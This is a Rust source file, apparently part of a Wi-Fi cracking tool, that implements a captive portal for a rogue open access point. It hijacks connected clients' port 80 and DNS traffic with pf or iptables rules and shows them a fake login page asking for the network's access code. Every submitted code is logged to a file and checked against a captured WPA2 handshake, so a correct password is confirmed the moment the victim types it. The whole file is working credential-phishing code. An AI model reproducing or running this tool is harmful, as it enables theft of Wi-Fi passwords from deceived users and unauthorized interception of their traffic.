/*!
 * Captive portal for the fake (rogue) open access point
 *
 * Once the open fake AP is broadcasting, this module serves a login page to
 * every HTTP request made by connected clients, asking for the "network
 * access code". Captive-portal detection probes (Apple / Android / Windows)
 * hit the same page, so the OS automatically pops the login window.
 *
 * Interception is done with a pf `rdr` rule scoped to the Internet Sharing
 * bridge interface: port 80 of portal clients is redirected to this HTTP
 * server. The original pf ruleset is restored on stop.
 *
 * If a captured handshake is supplied, every submitted code is verified
 * offline against it (same WPA2 crypto as the crack engine), so a correct
 * code is confirmed the moment the victim types it.
 */

use std::fs;
use std::fs::OpenOptions;
use std::io::{Read, Write};
use std::net::{SocketAddr, TcpListener, TcpStream};
use std::path::PathBuf;
use std::process::Command;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::Duration;

use anyhow::{anyhow, Context, Result};

use super::handshake::{parse_cap_file, Handshake};

const PF_ANCHOR: &str = "/etc/pf.anchors/brutifi-portal";
const PF_COMBINED: &str = "/tmp/brutifi_pf.conf";
const PF_ORIGINAL: &str = "/etc/pf.conf";
/// Max request size accepted from a client (header + body).
const MAX_REQUEST_BYTES: usize = 16 * 1024;

/// Shared control handle for a running portal.
pub struct PortalState {
    running: AtomicBool,
    port: u16,
}

impl PortalState {
    pub fn new(port: u16) -> Self {
        Self {
            running: AtomicBool::new(true),
            port,
        }
    }

    /// Stop the portal (idempotent). Wakes the accept loop via a loopback
    /// connection so teardown (pf restore) happens promptly.
    pub fn stop(&self) {
        self.running.store(false, Ordering::SeqCst);
        let addr = SocketAddr::from(([127, 0, 0, 1], self.port));
        if let Ok(stream) = TcpStream::connect_timeout(&addr, Duration::from_millis(500)) {
            // Consume nothing; the server closes as soon as it sees the flag.
            let _ = stream.shutdown(std::net::Shutdown::Both);
        }
    }

    pub fn is_running(&self) -> bool {
        self.running.load(Ordering::SeqCst)
    }
}

/// Portal configuration.
pub struct PortalConfig {
    /// Network name shown on the login page (the fake AP's SSID).
    pub ssid: String,
    /// Local port the HTTP portal listens on.
    pub port: u16,
    /// Captured handshake to verify submitted codes against
    /// (`PathBuf` = pcap file, `String` = SSID of the real network).
    pub verify: Option<(PathBuf, String)>,
    /// File every submitted code is appended to.
    pub codes_file: String,
}

/// Events surfaced by a running portal.
pub enum PortalEvent {
    Started {
        port: u16,
        redirect_active: bool,
        verifying: bool,
    },
    Log(String),
    /// A client submitted an access code. `valid` is `None` when no
    /// handshake is available (code logged without verification).
    Code {
        code: String,
        valid: Option<bool>,
    },
    Error(String),
}

/// Run the captive portal until `state` is stopped. Blocking.
///
/// Sets up the pf redirect, serves clients, and always restores pf on exit.
pub fn run_portal<F>(config: PortalConfig, state: Arc<PortalState>, on_event: F) -> Result<()>
where
    F: Fn(PortalEvent) + Send + Sync + Clone + 'static,
{
    // Optional offline verifier (captured handshake of the real network).
    let verifier = load_verifier(&config, &on_event);

    // Intercept port 80 of portal clients (pf / iptables) so captive-portal
    // detection probes land on this server.
    let redirect = enable_redirect(config.port);
    let redirect_active = redirect.is_ok();
    if let Err(ref e) = redirect {
        on_event(PortalEvent::Log(format!(
            "⚠️ port-80 redirect inactive ({e}) — the portal only serves direct requests"
        )));
    }

    let listener = match TcpListener::bind(("0.0.0.0", config.port)) {
        Ok(listener) => listener,
        Err(e) => {
            if let Ok(redirect) = redirect {
                let _ = disable_redirect(&redirect);
            }
            return Err(anyhow!(
                "failed to bind port {} ({}). Is another portal instance running?",
                config.port,
                e
            ));
        }
    };

    on_event(PortalEvent::Started {
        port: config.port,
        redirect_active,
        verifying: verifier.is_some(),
    });

    loop {
        match listener.accept() {
            Ok((stream, _)) => {
                if !state.is_running() {
                    break;
                }
                let ctx = ConnContext {
                    ssid: config.ssid.clone(),
                    verifier: verifier.clone(),
                    codes_file: config.codes_file.clone(),
                    state: state.clone(),
                    on_event: on_event.clone(),
                };
                std::thread::spawn(move || handle_connection(stream, ctx));
            }
            Err(_) => {
                if !state.is_running() {
                    break;
                }
                std::thread::sleep(Duration::from_millis(100));
            }
        }
    }

    if let Ok(redirect) = redirect {
        let _ = disable_redirect(&redirect);
    }
    on_event(PortalEvent::Log(
        "captive portal stopped — pf rules restored".to_string(),
    ));
    Ok(())
}

// --- Connection handling ----------------------------------------------------

struct ConnContext<F> {
    ssid: String,
    verifier: Option<Arc<Handshake>>,
    codes_file: String,
    state: Arc<PortalState>,
    on_event: F,
}

struct Request {
    method: String,
    path: String,
    body: String,
}

fn handle_connection<F>(mut stream: TcpStream, ctx: ConnContext<F>)
where
    F: Fn(PortalEvent) + Send + Sync + Clone + 'static,
{
    let _ = stream.set_read_timeout(Some(Duration::from_secs(5)));
    let _ = stream.set_write_timeout(Some(Duration::from_secs(5)));

    let Some(request) = read_request(&mut stream) else {
        return;
    };
    if !ctx.state.is_running() {
        return;
    }

    let is_submit = request.method == "POST" && request.path.split('?').next() == Some("/submit");
    if is_submit {
        let code: String = extract_form_value(&request.body, "code")
            .unwrap_or_default()
            .trim()
            .chars()
            .take(64)
            .collect();
        if code.is_empty() {
            respond(
                &mut stream,
                &login_page(&ctx.ssid, Some("Please enter the access code.")),
            );
            return;
        }

        let valid = ctx.verifier.as_ref().map(|hs| verify_code(hs, &code));
        append_code(&ctx.codes_file, &code, valid);
        (ctx.on_event)(PortalEvent::Code {
            code: code.clone(),
            valid,
        });

        let page = if valid == Some(true) {
            success_page(&ctx.ssid)
        } else {
            login_page(&ctx.ssid, Some("Incorrect access code. Please try again."))
        };
        respond(&mut stream, &page);
    } else {
        // Every other request (including captive-portal detection probes)
        // gets the login page, which triggers the OS login window.
        respond(&mut stream, &login_page(&ctx.ssid, None));
    }
}

fn respond(stream: &mut TcpStream, body: &str) {
    let response = format!(
        "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: {}\r\nCache-Control: no-store\r\nConnection: close\r\n\r\n{}",
        body.len(),
        body
    );
    let _ = stream.write_all(response.as_bytes());
    let _ = stream.flush();
}

/// Read one HTTP request (header + body up to Content-Length).
fn read_request(stream: &mut TcpStream) -> Option<Request> {
    let mut buf: Vec<u8> = Vec::with_capacity(2048);
    let mut chunk = [0u8; 1024];

    loop {
        match stream.read(&mut chunk) {
            Ok(0) => break,
            Ok(n) => {
                buf.extend_from_slice(&chunk[..n]);
                if header_end(&buf).is_some() || buf.len() >= MAX_REQUEST_BYTES {
                    break;
                }
            }
            Err(_) => return None,
        }
    }

    let header_end = header_end(&buf)?;
    let head = String::from_utf8_lossy(&buf[..header_end]).to_string();
    let mut lines = head.split("\r\n");

    let request_line = lines.next()?;
    let mut parts = request_line.split_whitespace();
    let method = parts.next()?.to_uppercase();
    let path = parts.next()?.to_string();

    let mut content_length = 0usize;
    for line in lines {
        if let Some(value) = line.to_lowercase().strip_prefix("content-length:") {
            content_length = value.trim().parse().unwrap_or(0);
        }
    }
    content_length = content_length.min(MAX_REQUEST_BYTES);

    let mut body = buf[header_end + 4..].to_vec();
    while body.len() < content_length {
        match stream.read(&mut chunk) {
            Ok(0) => break,
            Ok(n) => body.extend_from_slice(&chunk[..n]),
            Err(_) => break,
        }
    }
    body.truncate(content_length);

    Some(Request {
        method,
        path,
        body: String::from_utf8_lossy(&body).into_owned(),
    })
}

fn header_end(buf: &[u8]) -> Option<usize> {
    buf.windows(4).position(|w| w == b"\r\n\r\n")
}

/// Extract a URL-decoded value from an `application/x-www-form-urlencoded` body.
fn extract_form_value(body: &str, key: &str) -> Option<String> {
    for pair in body.split('&') {
        let (k, v) = pair.split_once('=')?;
        if k == key {
            return Some(percent_decode(v));
        }
    }
    None
}

/// Decode `+` as space and `%XX` hex escapes; invalid sequences pass through.
fn percent_decode(input: &str) -> String {
    let bytes = input.as_bytes();
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        match bytes[i] {
            b'+' => {
                out.push(b' ');
                i += 1;
            }
            b'%' if i + 2 < bytes.len() => {
                let hex = |b: u8| (b as char).to_digit(16);
                match (hex(bytes[i + 1]), hex(bytes[i + 2])) {
                    (Some(hi), Some(lo)) => {
                        out.push((hi * 16 + lo) as u8);
                        i += 3;
                    }
                    _ => {
                        out.push(b'%');
                        i += 1;
                    }
                }
            }
            b => {
                out.push(b);
                i += 1;
            }
        }
    }
    String::from_utf8_lossy(&out).into_owned()
}

// --- Code handling ----------------------------------------------------------

/// Load the offline verifier from a captured handshake (logs on failure and
/// falls back to code harvesting without verification).
fn load_verifier<F>(config: &PortalConfig, on_event: &F) -> Option<Arc<Handshake>>
where
    F: Fn(PortalEvent),
{
    let (path, ssid) = config.verify.as_ref()?;

    match parse_cap_file(path, Some(ssid)) {
        Ok(handshake) => {
            if handshake.mic.is_empty() || handshake.eapol_frame.is_empty() {
                on_event(PortalEvent::Log(
                    "⚠️ capture has no MIC (PMKID-only) — codes will be logged without verification"
                        .to_string(),
                ));
                return None;
            }
            Some(Arc::new(handshake))
        }
        Err(e) => {
            on_event(PortalEvent::Log(format!(
                "⚠️ cannot verify codes against {}: {} — logging only",
                path.display(),
                e
            )));
            None
        }
    }
}

/// Verify one submitted code against the captured handshake (single PBKDF2).
fn verify_code(handshake: &Handshake, code: &str) -> bool {
    super::crypto::verify_password_bytes(
        code.as_bytes(),
        handshake.ssid.as_bytes(),
        &handshake.ap_mac,
        &handshake.client_mac,
        &handshake.anonce,
        &handshake.snonce,
        &handshake.eapol_frame,
        &handshake.mic,
        handshake.key_version,
    )
}

fn append_code(path: &str, code: &str, valid: Option<bool>) {
    let verdict = match valid {
        Some(true) => "VALID",
        Some(false) => "invalid",
        None => "unverified",
    };
    let Ok(mut file) = OpenOptions::new().create(true).append(true).open(path) else {
        return;
    };
    let ts = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    let _ = writeln!(file, "{ts}\tcode='{code}'\t{verdict}");
}

// --- Portal pages -----------------------------------------------------------

fn html_escape(s: &str) -> String {
    s.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
}

/// The login page every client sees. `message` renders as a red error line.
fn login_page(ssid: &str, message: Option<&str>) -> String {
    let error = message
        .map(|m| format!(r#"<div class="err">{}</div>"#, html_escape(m)))
        .unwrap_or_default();
    let name = html_escape(ssid);

    format!(
        r#"<!doctype html>
<html><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Network Login</title>
<style>
body{{font-family:-apple-system,'Segoe UI',Roboto,sans-serif;background:#f2f4f8;
display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;color:#1c2733}}
.card{{background:#fff;border-radius:16px;box-shadow:0 10px 30px rgba(16,35,61,.12);
padding:34px 30px;max-width:340px;width:90%;text-align:center}}
h1{{font-size:19px;margin:0 0 6px}}
p{{font-size:13px;color:#5c6b7a;margin:0 0 20px}}
input{{width:100%;box-sizing:border-box;padding:12px;border:1px solid #d5dce4;
border-radius:10px;font-size:15px;text-align:center;margin-bottom:12px}}
button{{width:100%;padding:12px;background:#0a84ff;color:#fff;border:0;
border-radius:10px;font-size:15px;font-weight:600}}
.err{{color:#c0392b;font-size:12px;margin-bottom:14px}}
.note{{font-size:11px;color:#93a1b0;margin-top:18px}}
</style></head>
<body><div class="card">
<h1>Wi-Fi: {name}</h1>
<p>Enter the network access code to connect to the internet.</p>
{error}
<form method="POST" action="/submit">
<input type="password" name="code" placeholder="Access code" maxlength="64" autofocus required>
<button type="submit">Connect</button>
</form>
<div class="note">This network requires authentication.</div>
</div></body></html>"#
    )
}

fn success_page(ssid: &str) -> String {
    let name = html_escape(ssid);
    format!(
        r#"<!doctype html>
<html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Connected</title></head>
<body style="font-family:-apple-system,sans-serif;background:#f2f4f8;display:flex;
align-items:center;justify-content:center;min-height:100vh;margin:0;color:#1c2733">
<div class="card" style="background:#fff;border-radius:16px;padding:34px 30px;max-width:340px;
width:90%;text-align:center;box-shadow:0 10px 30px rgba(16,35,61,.12)">
<h1 style="font-size:19px;margin:0 0 6px">✔ Connected</h1>
<p style="font-size:13px;color:#5c6b7a;margin:0">Access code accepted for <b>{name}</b>.
You can now use the internet.</p>
</div></body></html>"#
    )
}

// --- Port-80 redirect (pf on macOS, iptables on Linux) ----------------------

/// Snapshot of the redirect so `disable_redirect` can restore it exactly.
enum Redirect {
    /// macOS packet-filter anchor.
    Pf(PfRedirect),
    /// Linux iptables nat rule.
    Iptables { iface: String, port: u16 },
}

/// Snapshot of pf state so `disable_redirect` can restore it exactly.
struct PfRedirect {
    /// Whether pf was enabled before we touched it.
    was_enabled: bool,
}

fn find_sharing_gateway() -> Option<(String, String)> {
    let output = Command::new("ifconfig").arg("-a").output().ok()?;
    let text = String::from_utf8_lossy(&output.stdout);

    let mut current_bridge: Option<String> = None;
    for line in text.lines() {
        if !line.starts_with(char::is_whitespace) {
            // New interface block header, e.g. "bridge100: flags=..."
            current_bridge = line
                .split(':')
                .next()
                .filter(|name| name.starts_with("bridge"))
                .map(str::to_string);
        } else if let (Some(name), true) = (&current_bridge, line.trim().starts_with("inet ")) {
            let ip = line.split_whitespace().nth(1)?;
            if !ip.starts_with("127.") {
                return Some((name.clone(), ip.to_string()));
            }
        }
    }
    None
}

fn pf_enabled() -> bool {
    let output = Command::new("pfctl")
        .args(["-s", "info"])
        .output()
        .ok()
        .map(|o| String::from_utf8_lossy(&o.stdout).to_string());
    matches!(&output, Some(info) if info.contains("Status: Enabled"))
}

/// Redirect port 80 of portal clients to the portal HTTP server.
fn enable_redirect(port: u16) -> Result<Redirect> {
    if cfg!(target_os = "linux") {
        return enable_redirect_linux(port);
    }
    enable_redirect_macos(port).map(Redirect::Pf)
}

/// Restore the original redirect configuration.
fn disable_redirect(redirect: &Redirect) -> Result<()> {
    match redirect {
        Redirect::Pf(pf) => disable_redirect_pf(pf),
        Redirect::Iptables { iface, port } => {
            // Deletes mirror the -A rules exactly (80 + DNS hijacks).
            let rules: [&[&str]; 3] = [
                &[
                    "-p",
                    "tcp",
                    "--dport",
                    "80",
                    "-j",
                    "REDIRECT",
                    "--to-port",
                    &port.to_string(),
                ],
                &[
                    "-p",
                    "udp",
                    "--dport",
                    "53",
                    "-j",
                    "REDIRECT",
                    "--to-port",
                    "53",
                ],
                &[
                    "-p",
                    "tcp",
                    "--dport",
                    "53",
                    "-j",
                    "REDIRECT",
                    "--to-port",
                    "53",
                ],
            ];
            for rule in rules {
                let _ = Command::new("iptables")
                    .args(["-t", "nat", "-D", "PREROUTING", "-i", iface])
                    .args(rule)
                    .output();
            }
            Ok(())
        }
    }
}

/// Linux: nat PREROUTING rules scoped to the AP interface:
/// - port 80 → the portal HTTP server, so captive-portal detection probes
///   hit the login page;
/// - port 53 (UDP/TCP) → dnsmasq, so even clients with a hardcoded DNS
///   server (e.g. 8.8.8.8) resolve everything to this host.
fn enable_redirect_linux(port: u16) -> Result<Redirect> {
    if unsafe { libc::geteuid() } != 0 {
        return Err(anyhow!("root required"));
    }

    let iface = find_ap_interface_linux()
        .or_else(super::network::first_wireless_interface_linux)
        .ok_or_else(|| anyhow!("AP interface not found — is the fake AP running?"))?;

    let rules: [&[&str]; 3] = [
        &[
            "-p",
            "tcp",
            "--dport",
            "80",
            "-j",
            "REDIRECT",
            "--to-port",
            &port.to_string(),
        ],
        &[
            "-p",
            "udp",
            "--dport",
            "53",
            "-j",
            "REDIRECT",
            "--to-port",
            "53",
        ],
        &[
            "-p",
            "tcp",
            "--dport",
            "53",
            "-j",
            "REDIRECT",
            "--to-port",
            "53",
        ],
    ];
    for rule in rules {
        let add = Command::new("iptables")
            .args(["-t", "nat", "-A", "PREROUTING", "-i", &iface])
            .args(rule)
            .output()
            .context("failed to run iptables (sudo apt install iptables)")?;
        if !add.status.success() {
            return Err(anyhow!(
                "iptables rejected the redirect: {}",
                String::from_utf8_lossy(&add.stderr).trim()
            ));
        }
    }

    Ok(Redirect::Iptables { iface, port })
}

/// The interface holding the AP gateway address (`ip -4 addr show`).
fn find_ap_interface_linux() -> Option<String> {
    let output = Command::new("ip")
        .args(["-4", "addr", "show"])
        .output()
        .ok()?;
    let text = String::from_utf8_lossy(&output.stdout);
    let needle = format!("inet {}/", super::rogue_ap::AP_GATEWAY);

    let mut current: Option<String> = None;
    for line in text.lines() {
        if !line.starts_with(char::is_whitespace) {
            // Block header, e.g. "3: wlan0 <BROADCAST,MULTICAST,UP,...>"
            current = line
                .split(':')
                .nth(1)
                .and_then(|rest| rest.split_whitespace().next())
                .map(str::to_string);
        } else if line.contains(&needle) {
            return current;
        }
    }
    None
}

/// macOS: pf anchor redirect.
fn enable_redirect_macos(port: u16) -> Result<PfRedirect> {
    if unsafe { libc::geteuid() } != 0 {
        return Err(anyhow!("root required"));
    }

    let (iface, gateway_ip) = find_sharing_gateway().ok_or_else(|| {
        anyhow!("Internet Sharing bridge interface not found — is the fake AP up?")
    })?;
    let was_enabled = pf_enabled();

    fs::write(
        PF_ANCHOR,
        format!(
            "rdr pass on {iface} proto tcp from any to any port 80 -> {gateway_ip} port {port}\n"
        ),
    )
    .context("failed to write pf anchor")?;

    let base = fs::read_to_string(PF_ORIGINAL).context("failed to read /etc/pf.conf")?;
    let combined = format!(
        "{base}\nrdr-anchor \"brutifi-portal\"\nload anchor \"brutifi-portal\" from \"{PF_ANCHOR}\"\n"
    );
    fs::write(PF_COMBINED, combined).context("failed to write pf ruleset")?;

    let load = Command::new("pfctl")
        .args(["-f", PF_COMBINED])
        .output()
        .context("failed to run pfctl")?;
    if !load.status.success() {
        let _ = fs::remove_file(PF_ANCHOR);
        return Err(anyhow!(
            "pfctl rejected the ruleset: {}",
            String::from_utf8_lossy(&load.stderr).trim()
        ));
    }

    if !was_enabled {
        let _ = Command::new("pfctl").arg("-E").output();
    }

    Ok(PfRedirect { was_enabled })
}

/// Restore the original pf ruleset (and disable pf if we enabled it).
fn disable_redirect_pf(redirect: &PfRedirect) -> Result<()> {
    let _ = Command::new("pfctl").args(["-f", PF_ORIGINAL]).output();
    if !redirect.was_enabled {
        let _ = Command::new("pfctl").arg("-d").output();
    }
    let _ = fs::remove_file(PF_ANCHOR);
    let _ = fs::remove_file(PF_COMBINED);
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The portal must serve the login page to any client (that is what
    /// makes captive-portal detection pop the login window) and harvest
    /// submitted codes, all without root — pf setup just fails gracefully.
    #[test]
    fn serves_login_page_and_harvests_codes() {
        let port = 18080;
        let codes_file = "/tmp/brutifi_portal_codes_test.txt";
        let _ = fs::remove_file(codes_file);

        let state = Arc::new(PortalState::new(port));
        let worker_state = state.clone();
        let handle = std::thread::spawn(move || {
            run_portal(
                PortalConfig {
                    ssid: "TestNet".to_string(),
                    port,
                    verify: None,
                    codes_file: codes_file.to_string(),
                },
                worker_state,
                |_| {},
            )
        });

        // Wait for the listener to come up.
        let mut online = false;
        for _ in 0..50 {
            if TcpStream::connect(("127.0.0.1", port)).is_ok() {
                online = true;
                break;
            }
            std::thread::sleep(Duration::from_millis(100));
        }
        assert!(online, "portal listener came up");

        // GET (like a captive-portal detection probe) → login page.
        let page = http_roundtrip(port, "GET / HTTP/1.1\r\nHost: captive.probe\r\n\r\n");
        assert!(page.contains("HTTP/1.1 200 OK"));
        assert!(page.contains("TestNet"));
        assert!(page.contains("Access code"));

        // POST a code → rejected (no handshake on file) and harvested.
        let body = "code=12345678";
        let post = format!(
            "POST /submit HTTP/1.1\r\nHost: captive.probe\r\nContent-Length: {}\r\n\r\n{}",
            body.len(),
            body
        );
        let reply = http_roundtrip(port, &post);
        assert!(reply.contains("Incorrect access code"));

        state.stop();
        handle
            .join()
            .expect("portal thread")
            .expect("portal ran cleanly");

        let logged = fs::read_to_string(codes_file).unwrap_or_default();
        assert!(
            logged.contains("12345678"),
            "code appended to the codes file"
        );
        let _ = fs::remove_file(codes_file);
    }

    fn http_roundtrip(port: u16, raw: &str) -> String {
        let mut stream = TcpStream::connect(("127.0.0.1", port)).expect("connect");
        stream.write_all(raw.as_bytes()).expect("write");
        let mut buf = String::new();
        stream.read_to_string(&mut buf).expect("read response");
        buf
    }
}
